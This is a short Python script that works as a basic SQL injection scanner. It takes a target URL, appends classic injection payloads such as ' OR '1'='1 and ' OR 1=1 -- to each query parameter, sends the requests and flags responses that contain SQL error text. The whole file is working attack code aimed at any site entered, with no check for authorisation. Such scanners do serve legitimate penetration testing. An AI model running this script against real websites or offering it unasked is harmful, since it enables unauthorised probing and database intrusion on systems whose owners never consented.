import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

payloads = [
    "'",
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"a\"=\"a"
]

def test_dynamic_sqli(url):
    results = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        print("No parameters found in URL.")
        return []

    for param in params:
        original_value = params[param][0]

        for payload in payloads:
            test_params = params.copy()
            test_params[param] = original_value + payload

            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))

            try:
                response = requests.get(test_url, timeout=10)

                sql_errors = ["sql syntax", "mysql", "syntax error", "warning"]
                is_vulnerable = any(error in response.text.lower() for error in sql_errors)

                results.append({
                    "parameter": param,
                    "payload": payload,
                    "test_url": test_url,
                    "status_code": response.status_code,
                    "possible_vulnerability": is_vulnerable
                })

            except requests.RequestException as e:
                results.append({
                    "parameter": param,
                    "payload": payload,
                    "error": str(e),
                    "possible_vulnerability": False
                })

    return results


# Main
target = input("Enter target URL (with parameters): ")
results = test_dynamic_sqli(target)

for r in results:
    print(r)